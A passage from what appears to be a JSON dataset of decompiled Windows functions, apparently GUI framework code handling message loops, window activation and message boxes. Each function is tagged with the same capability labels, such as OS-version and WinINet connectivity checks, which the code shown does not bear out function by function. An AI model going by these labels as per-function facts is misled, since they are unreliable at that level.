            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004453a0(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xc4) = *(in_EAX + 0xc4) + -1;\n    if ((*(in_EAX + 0xc4) == 0) && (*(in_EAX + 0x112) != 0)) {\n        (**(in_EAX + 0x110))();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "0044542c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044542c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (((*(in_EAX + 0x30) != 0) && (0 < *(in_EAX + 0x94))) &&\n       (*(in_EAX + 0x94) = *(in_EAX + 0x94) + -1,  *(in_EAX + 0x94) == 0)) {\n        iVar1 = *(*(in_EAX + 0x90) + 8) + -1;\n        if (-1 < iVar1) {\n            do {\n                fcn.004198b4(0xffffffff, 0, 0, 0, 0, 0x213);\n                sub.user32.dll_SetWindowPos();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        (**(**(in_EAX + 0x90) + 8))();\n    }\n    return;\n}\n",
        "token_count": 221
    },
    "00445588": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445588(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    \n    if (*(*0x49ac1c + 0x30) != 0) {\n        if (param_2 == '\\0') {\n            if (*(in_EAX + 0x9c) == 0) {\n                uVar2 = fcn.00447bc8();\n                pcVar4 = fcn.004454b4;\n                sub.user32.dll_EnumWindows(fcn.004454b4, uVar2);\n                if (*(in_EAX + 0x44) != 0) {\n                    cVar1 = fcn.004481b8();\n                    if (cVar1 != '\\0') {\n                        iVar3 = fcn.00406774();\n                        if (-1 < iVar3) {\n                            do {\n                                pcVar4 = *(*0x49ac40 + iVar3 * 4);\n                                sub.user32.dll_ShowWindow();\n                                iVar3 = iVar3 + -1;\n                            } while (iVar3 != -1);\n                        }\n                    }\n                }\n                iVar3 = *(*(in_EAX + 0x98) + 8) + -1;\n                if (-1 < iVar3) {\n                    do {\n                        pcVar4 = fcn.004198b4(0, pcVar4);\n                        sub.user32.dll_ShowOwnedPopups();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n            }\n            *(in_EAX + 0x9c) = *(in_EAX + 0x9c) + 1;\n        }\n        else if ((0 < *(in_EAX + 0x9c)) && (*(in_EAX + 0x9c) = *(in_EAX + 0x9c) + -1,  *(in_EAX + 0x9c) == 0)) {\n            if (*(in_EAX + 0x44) != 0) {\n                cVar1 = fcn.004481b8();\n                if (cVar1 != '\\0') {\n                    iVar3 = fcn.00406774();\n                    if (-1 < iVar3) {\n                        do {\n                            sub.user32.dll_ShowWindow();\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != -1);\n                    }\n                }\n            }\n            iVar3 = *(*(in_EAX + 0x98) + 8) + -1;\n            if (-1 < iVar3) {\n                do {\n                    fcn.004198b4(-(param_2 != '\\0'));\n                    sub.user32.dll_ShowOwnedPopups();\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            (**(**(in_EAX + 0x98) + 8))();\n            fcn.00406928(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 665
    },
    "004456ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004456ec(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x495d2c + 0xd) != '\\0') && (*(in_EAX + 0x34) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 68
    },
    "00445704": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00445704(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x495d2c + 0xd) != '\\0') && (*(in_EAX + 0x34) == '\\x01')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 69
    },
    "0044571c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044571c(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*param_2 == *0x49ac28) || (*param_2 == 0x1a)) {\n        if (*(in_EAX + 0x59) != '\\0') {\n            sub.kernel32.dll_SetThreadLocale(0x400);\n            fcn.0040ebd4();\n        }\n        if (*(in_EAX + 0x5a) != '\\0') {\n            fcn.004442e0();\n        }\n        if (*param_2 == *0x49ac28) {\n            fcn.00444960();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 165
    },
    "00445774": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445774(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4457d1;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x162) != 0) {\n        fcn.00405728();\n        (**(in_EAX + 0x160))(param_2 + 0xc, 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4457d8;\n    uStack24 = 0x4457d0;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 210
    },
    "00445f2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445f2c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.0043b6f8();\n    if (iVar2 != 0) {\n        return;\n    }\n    *0x49ac2c = 1;\n    fcn.004453cc();\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    fcn.00445588();\n    if ((*(in_EAX + 0x44) != 0) && ((*(in_EAX + 0x5b) != '\\0' || (*(*(in_EAX + 0x44) + 0x57) != '\\0')))) {\n        uVar3 = fcn.00458594();\n        iVar2 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if (iVar2 != 0) {\n            cVar1 = fcn.004481b8();\n            if (cVar1 == '\\0') {\n                uVar3 = fcn.0043df58(*(*(in_EAX + 0x44) + 0x48), 0, 0x40);\n                uVar3 = fcn.0043df38(uVar3);\n                uVar3 = fcn.00458594(uVar3);\n                sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), uVar3);\n                sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf020, 0);\n            }\n            else {\n                fcn.0043fd50();\n            }\n            goto code_r0x00445ff0;\n        }\n    }\n    fcn.00444be0();\ncode_r0x00445ff0:\n    if (*(in_EAX + 0x142) != 0) {\n        (**(in_EAX + 0x140))();\n    }\n    return;\n}\n",
        "token_count": 442
    },
    "0044600c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044600c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    \n    iVar2 = fcn.0043b6f8();\n    if (iVar2 == 0) {\n        return;\n    }\n    *0x49ac2c = 0;\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    if (*(in_EAX + 0x44) == 0) goto code_r0x004460d3;\n    cVar1 = fcn.004481b8();\n    if (cVar1 != '\\0') {\n        uVar3 = fcn.00458594(9);\n        sub.user32.dll_ShowWindow(uVar3);\n        goto code_r0x004460d3;\n    }\n    if ((*(in_EAX + 0x5b) == '\\0') && (*(*(in_EAX + 0x44) + 0x57) == '\\0')) {\ncode_r0x0044608f:\n        fcn.00444be0();\n    }\n    else {\n        uVar3 = fcn.00458594();\n        iVar2 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if (iVar2 == 0) goto code_r0x0044608f;\n        sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf120, 0);\n    }\n    uVar4 = (***0x495974)(1, 0, 0, 0x40);\n    iVar2 = uVar4 >> 1;\n    if (iVar2 < 0) {\n        iVar2 = iVar2 + ((uVar4 & 1) != 0);\n    }\n    uVar4 = (***0x495974)(0, iVar2);\n    iVar2 = uVar4 >> 1;\n    if (iVar2 < 0) {\n        iVar2 = iVar2 + ((uVar4 & 1) != 0);\n    }\n    sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), 0, iVar2);\ncode_r0x004460d3:\n    iVar2 = *(in_EAX + 0x44);\n    if (((iVar2 != 0) && (*(iVar2 + 0x273) == '\\x01')) && (*(iVar2 + 0x57) == '\\0')) {\n        fcn.0043fd50();\n        fcn.00442b48();\n    }\n    fcn.0044542c();\n    fcn.00445588();\n    if (*(*0x49ac20 + 100) != 0) {\n        uVar3 = fcn.00458594();\n        sub.user32.dll_SetFocus(uVar3);\n    }\n    if (*(in_EAX + 0x14a) != 0) {\n        (**(in_EAX + 0x148))();\n    }\n    return;\n}\n",
        "token_count": 668
    },
    "004461f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004461f8(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(in_EAX + 0xb8) != 0) {\n        iVar1 = sub.user32.dll_IsWindowUnicode(*param_2);\n        if (iVar1 == 0) {\n            iVar1 = sub.user32.dll_IsDialogMessageA(*(in_EAX + 0xb8), param_2);\n            bVar2 = iVar1 != 0;\n        }\n        else {\n            iVar1 = sub.user32.dll_IsDialogMessageW(*(in_EAX + 0xb8), param_2);\n            bVar2 = iVar1 != 0;\n        }\n    }\n    return bVar2;\n}\n",
        "token_count": 185
    },
    "00446240": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00446240(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    iVar1 = *(in_EAX + 0x44);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x277) == '\\x02')) && (*(*0x49ac20 + 0x6c) != 0)) &&\n       (*(*(*0x49ac20 + 0x6c) + 0x277) == '\\x01')) {\n        iVar1 = sub.user32.dll_TranslateMDISysAccel(*(iVar1 + 0x29c), param_2);\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 185
    },
    "004463b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.004463b8(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if (*(in_EAX + 0x152) != 0) {\n        (**(in_EAX + 0x150))();\n    }\n    if (*(in_EAX + 0x44) != 0) {\n        uVar3 = fcn.00458594();\n        iVar4 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if ((iVar4 != 0) && (cVar1 = fcn.0040484c(),  cVar1 != '\\0')) {\n            uVar2 = 1;\n            goto code_r0x00446415;\n        }\n    }\n    uVar2 = 0;\ncode_r0x00446415:\n    return CONCAT14(uVar2, uVar2);\n}\n",
        "token_count": 209
    },
    "004464c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004464c0(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    char cStackY68;\n    int32_t *in_stack_ffffffc0;\n    \n    uVar4 = 0;\n    iVar3 = sub.user32.dll_PeekMessageA(param_2, 0, 0, 0, 0, param_1);\n    if (iVar3 == 0) goto code_r0x004465ca;\n    if (*param_2 == 0) {\ncode_r0x004464f1:\n        bVar1 = false;\n    }\n    else {\n        iVar3 = sub.user32.dll_IsWindowUnicode();\n        if (iVar3 == 0) goto code_r0x004464f1;\n        bVar1 = true;\n    }\n    in_stack_ffffffc0 = param_2;\n    if (bVar1) {\n        iVar3 = sub.user32.dll_PeekMessageW(param_2, 0, 0, 0, 1);\n    }\n    else {\n        iVar3 = sub.user32.dll_PeekMessageA(param_2, 0, 0, 0, 1);\n    }\n    if (iVar3 != 0) {\n        uVar4 = 1;\n        if (param_2[1] == 0x12) {\n            *(in_EAX + 0xa4) = 1;\n        }\n        else {\n            in_stack_ffffffc0 = in_stack_ffffffc0 & 0xffff00ff;\n            if (*(in_EAX + 0x102) != 0) {\n                (**(in_EAX + 0x100))();\n            }\n            cVar2 = fcn.00447d6c();\n            if (cVar2 == '\\0') {\n                cVar2 = fcn.00446384();\n                if ((cVar2 == '\\0') && (in_stack_ffffffc0 >> 8 == '\\0')) {\n                    cVar2 = fcn.00446240();\n                    if (cVar2 == '\\0') {\n                        cVar2 = fcn.00446290();\n                        if (cVar2 == '\\0') {\n                            cVar2 = fcn.004461f8();\n                            if (cVar2 == '\\0') {\n                                sub.user32.dll_TranslateMessage();\n                                cStackY68 = param_2;\n                                if (cStackY68 == '\\0') {\n                                    sub.user32.dll_DispatchMessageA();\n                                    in_stack_ffffffc0 = param_2;\n                                }\n                                else {\n                                    sub.user32.dll_DispatchMessageW();\n                                    in_stack_ffffffc0 = param_2;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x004465ca:\n    return CONCAT44(in_stack_ffffffc0, uVar4);\n}\n",
        "token_count": 654
    },
    "004465f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004465f8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (*(in_EAX + 0xac) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 0, &arg_8h);\n        }\n    }\n    else {\n        fcn.00419894();\n        puVar1 = fcn.00402f00();\n        *puVar1 = arg_8h;\n        puVar1[1] = arg_ch;\n        fcn.0041975c();\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "00446654": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446654(int32_t lParam, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0xac) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 1, &lParam);\n        }\n    }\n    else {\n        iVar2 = *(*(in_EAX + 0xb0) + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004198b4();\n                if ((*piVar1 == lParam) && (arg_ch == piVar1[1])) {\n                    fcn.00402f1c();\n                    fcn.004197a8();\n                    return;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "00446740": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00446740(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        uVar3 = sub.user32.dll_GetCapture(0x1f, 0, 0);\n        sub.user32.dll_SendMessageA(uVar3);\n    }\n    fcn.00402f84();\n    cVar1 = fcn.004466e4();\n    if (cVar1 == '\\0') {\n        uVar3 = fcn.00402fa4();\n        fcn.00402f84(uVar3);\n        fcn.0040da3c();\n    }\n    else {\n        fcn.00402f84();\n        cVar1 = fcn.004466e4();\n        if (cVar1 == '\\0') {\n            if (*(in_EAX + 0xea) == 0) {\n                fcn.00402f84();\n                fcn.0044694c();\n                return;\n            }\n            fcn.00402f84();\n            (**(in_EAX + 0xe8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 272
    },
    "004467d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004467d0(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack132;\n    int32_t iStack128;\n    uint *puStack124;\n    uint uStack120;\n    uint uStack116;\n    int32_t iStack112;\n    int32_t iStack108;\n    int32_t lpRect;\n    uint *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t hWnd;\n    uint var_ch;\n    uint lpCaption;\n    int32_t var_4h;\n    \n    iStack108 = 0x4467ec;\n    var_4h = in_EAX;\n    iStack112 = fcn.00447b80();\n    iVar2 = iStack112;\n    if (iStack112 == 0) {\n        iVar2 = *(var_4h + 0x30);\n    }\n    iStack108 = 2;\n    uStack116 = 0x44680f;\n    hWnd = iStack112;\n    var_18h = (***0x495a24)();\n    uStack116 = 2;\n    uStack120 = *(var_4h + 0x30);\n    puStack124 = 0x446824;\n    var_1ch = (***0x495a24)();\n    if (var_18h != var_1ch) {\n        var_48h = 0x28;\n        puStack124 = &fcn.004467d0::var_48h;\n        iStack128 = var_18h;\n        iStack132 = 0x446847;\n        (***0x49594c)();\n        var_54h = &fcn.004467d0::lpRect;\n        lpRect = *(var_4h + 0x30);\n        sub.user32.dll_GetWindowRect();\n        iStack108 = var_38h - var_40h >> 1;\n        if (iStack108 < 0) {\n            iStack108 = iStack108 + ((var_38h - var_40h & 1U) != 0);\n        }\n        iStack108 = iStack108 + var_40h;\n        iStack112 = var_3ch - var_44h >> 1;\n        if (iStack112 < 0) {\n            iStack112 = iStack112 + ((var_3ch - var_44h & 1U) != 0);\n        }\n        iStack112 = iStack112 + var_44h;\n        uStack116 = 0;\n        uStack120 = *(var_4h + 0x30);\n        puStack124 = 0x44688f;\n        sub.user32.dll_SetWindowPos();\n    }\n    puStack124 = 0x446897;\n    var_14h = fcn.0043b8bc();\n    puStack124 = 0x44689f;\n    var_20h = fcn.0043b718();\n    puStack124 = 0x4468aa;\n    cVar1 = fcn.004456ec();\n    if (cVar1 != '\\0') {\n        arg_8h = arg_8h | 0x100000;\n    }\n    iStack128 = 0x446938;\n    iStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    var_ch = sub.user32.dll_MessageBoxA_1();\n    *in_FS_OFFSET = iVar2;\n    if (var_18h != var_1ch) {\n        iVar2 = var_4ch - var_54h >> 1;\n        if (iVar2 < 0) {\n            iVar2 = iVar2 + ((var_4ch - var_54h & 1U) != 0);\n        }\n        iVar3 = var_50h - lpRect >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((var_50h - lpRect & 1U) != 0);\n        }\n        sub.user32.dll_SetWindowPos(*(var_4h + 0x30), 0, iVar3 + lpRect, iVar2 + var_54h, 0, 0, 0x1d, 0x44693f, arg_8h);\n    }\n    fcn.0043b980();\n    sub.user32.dll_SetActiveWindow(hWnd);\n    fcn.0043b720();\n    return;\n}\n",
        "token_count": 1098
    },
    "0044694c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00446985)\n// WARNING: Removing unreachable block (ram,0x004469ac)\n\nvoid fcn.0044694c(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x446a07;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee0;\n    fcn.004055c8();\n    arg_8h = 0x10;\n    fcn.00446178();\n    uVar1 = fcn.004059dc();\n    fcn.004059dc(uVar1);\n    fcn.004467d0(arg_8h);\n    *in_FS_OFFSET = arg_8h;\n    uStack284 = 0x446a0e;\n    uStack288 = 0x4469fe;\n    fcn.00405530();\n    uStack288 = 0x446a06;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 281
    },
    "00446a24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00446a24(char param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *arg_8h;\n    char cStack28;\n    uint uStack24;\n    \n    iVar4 = 0;\n    uStack24 = CONCAT31(uStack24._1_3_, 1);\n    arg_8h = &uStack24;\n    uVar3 = fcn.00446b4c(arg_8h);\n    cStack28 = param_1;\n    if (uVar3 == '\\0') {\n        iVar4 = *(*0x49ac20 + 0x68);\n        if ((iVar4 != 0) && ((*(iVar4 + 0x1c) & 0x10) != 0)) {\n            cStack28 = '\\0';\n        }\n        if ((((iVar4 != 0) && (iVar2 = fcn.004587b0(),  iVar2 == -1)) && (*(iVar4 + 0x57) == '\\0')) &&\n           (*(iVar4 + 0x268) == 0)) {\n            cStack28 = '\\0';\n        }\n    }\n    if (cStack28 != '\\0') {\n        if (((iVar4 != 0) && (cVar1 = fcn.004588a0(),  cVar1 != '\\0')) && (*(iVar4 + 0x284) != 0)) {\n            uStack24 = fcn.00458594();\n            cVar1 = fcn.004471e8();\n            if (cVar1 == '\\0') {\n                return uVar3;\n            }\n            uVar3 = (**(**(in_EAX + 0x4c) + 0x20))(arg_8h, param_2);\n            return uVar3;\n        }\n        if (*(in_EAX + 0x50) == 0) {\n            if (*(in_EAX + 0xac) == '\\0') {\n                sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01f, param_2 & 0xffff, arg_8h);\n            }\n        }\n        else {\n            uStack24 = *(in_EAX + 0x30);\n            if (*(in_EAX + 0x44) != 0) {\n                uStack24 = fcn.00458594();\n            }\n            cVar1 = fcn.004471e8();\n            if (cVar1 != '\\0') {\n                uVar3 = (**(**(in_EAX + 0x4c) + 0x20))(arg_8h, param_2);\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 617
    },
    "00446b4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00446b4c(uchar *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_6h;\n    \n    uVar2 = 0;\n    *arg_8h = 1;\n    iVar3 = 0;\n    if (*(*0x49ac20 + 100) != 0) {\n        iVar3 = fcn.0043bd2c();\n        if ((iVar3 != 0) && (*(iVar3 + 0x2f2) != 0)) {\n            uVar2 = (**(iVar3 + 0x2f0))(arg_8h);\n        }\n    }\n    if (uVar2 == '\\0') {\n        iVar1 = *(*0x49ac20 + 0x68);\n        if ((((iVar1 != 0) && (iVar3 != iVar1)) && (iVar1 != 0)) && (*(iVar1 + 0x2f2) != 0)) {\n            uVar2 = (**(iVar1 + 0x2f0))(arg_8h);\n        }\n        if ((uVar2 == '\\0') && (*(in_EAX + 0x11a) != 0)) {\n            uVar2 = (**(in_EAX + 0x118))(arg_8h);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 322
    },
    "00446c18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00446c18(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &fcn.00446c18::var_1h + 1;\n    uStack32 = 0x446c96;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    arg_8h = &fcn.00446c18::var_1h;\n    fcn.004059dc();\n    fcn.00446b4c(arg_8h);\n    if ((var_1h != '\\0') && (cVar1 = fcn.004471e8(),  cVar1 != '\\0')) {\n        fcn.00447b44();\n        (**(**(in_EAX + 0x4c) + 0xc))();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x446c9d;\n    iStack36 = 0x446c95;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 314
    },
    "00446ca8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
